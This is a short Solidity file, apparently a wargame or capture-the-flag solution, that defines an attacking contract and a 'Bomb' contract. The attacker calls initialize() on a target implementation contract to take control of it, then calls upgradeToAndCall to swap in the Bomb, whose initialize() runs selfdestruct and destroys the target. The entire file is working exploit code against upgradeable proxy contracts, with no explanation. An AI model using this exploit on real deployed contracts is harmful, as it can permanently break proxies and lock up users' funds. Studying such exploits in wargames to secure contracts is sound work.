// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "@openzeppelin/contracts/access/Ownable.sol";

contract HackEngine {
    address public originalContract;
    event logEvent(bool, bytes);

    constructor(address _target) public {
        originalContract = _target;
    }
    function attackEngine() external {
        (bool success, bytes memory data) = address(originalContract).call(
            abi.encodeWithSignature("initialize()")
        );
        emit logEvent(success, data);
    }

    function destroyWithBomb() external {
        // pass in a bomb which blows up when initialize is called
        Bomb bomb = new Bomb();

        (bool success, bytes memory data) = address(originalContract).call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(bomb),
                abi.encodeWithSignature("initialize()")
            )
        );
        emit logEvent(success, data);
    }
}

contract Bomb {
    function initialize() public {
        selfdestruct(msg.sender);
    }
}
